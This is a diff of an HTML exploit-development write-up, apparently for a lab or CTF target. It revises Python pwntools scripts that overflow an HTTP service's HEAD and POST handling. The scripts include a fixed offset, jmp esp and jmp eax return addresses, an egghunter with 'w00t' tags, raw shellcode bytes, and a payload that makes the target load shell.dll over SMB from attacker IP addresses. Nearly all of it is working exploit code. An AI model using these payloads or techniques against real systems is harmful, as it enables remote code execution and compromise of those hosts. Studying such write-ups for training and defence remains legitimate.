@@ -532,10 +532,10 @@ cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-ret </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
-stack </span><span class="o">=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
-
-payload</span><span class="o"> =</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
@@ -573,10 +573,11 @@ cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
 
-egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
 shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">"</span><span class="o"> +</span><span class="p"> payload
 
@@ -587,10 +588,10 @@ shell.close()
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-ret</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
-stack</span><span class="o"> =</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
 content</span><span class="o"> =</span><span class="no"> f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()}</span><span class="s"> HTTP/1.1"</span><span class="p">.encode()  
 
@@ -817,8 +818,6 @@ shellcode += b"\x63\x2e\x65\x78\x65\x00"</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
 
-egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
-
 shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0</span><span class="s">"</span><span class="p">  
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s">"</span><span class="p">  
@@ -839,7 +838,9 @@ shellcode </span><span class="o">+=</span><span class="no"> b</span><span class=
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">"</span><span class="o"> +</span><span class="p"> payload
 
@@ -850,13 +851,14 @@ shell.close()
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
-
 egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
 egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">) </span><span class="c1"># jmp esp</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> egghunter
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()
 
@@ -918,8 +920,6 @@ shellcode += b"\x9c\x2f\xf4\x06\x8d\xc5\xfa\xb5\xae\xcf"</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
 
-egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> * </span><span class="mi">2</span><span class="p">
-
 shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xbf\x84</span><span class="s">"
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x68\xea\xb1\x52\x31\x7a\x17\x83\xc2\x04</span><span class="s">"
@@ -954,7 +954,9 @@ shellcode </span><span class="o">= </span><span class="no">b</span><span class="
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf4\x46\x8e\x23\x77\x62\x6f\xd0\x67\x07\x6a</span><span class="s">"
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x2f\xf4\x06\x8d\xc5\xfa\xb5\xae\xcf</span><span class="s">"
 </span><span class="p">
-payload </span><span class="o">= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 content </span><span class="o">= </span><span class="no">b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload
 
@@ -965,13 +967,14 @@ shell.close()
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
-
 egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
 egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">) </span><span class="c1"># jmp esp</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> egghunter
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()
 
@@ -1048,10 +1051,10 @@ Hold on...
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-ret </span><span class="o">=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
-stack </span><span class="o">=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
-
-payload</span><span class="o"> =</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> ret</span><span class="o"> +</span><span class="p"> stack
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 60</span><span class="p">
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
@@ -1133,11 +1136,13 @@ dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
-
 smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">dll
+payload </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">) </span><span class="c1"># jmp eax;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> smb
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
@@ -1206,11 +1211,13 @@ dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
-
 smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">dll
+payload </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">) </span><span class="c1"># jmp eax;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> smb
 
 content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
 
@@ -1704,3 +1711,4 @@ Session completed.</span>
     </div>
   </body>
 </html>
+>
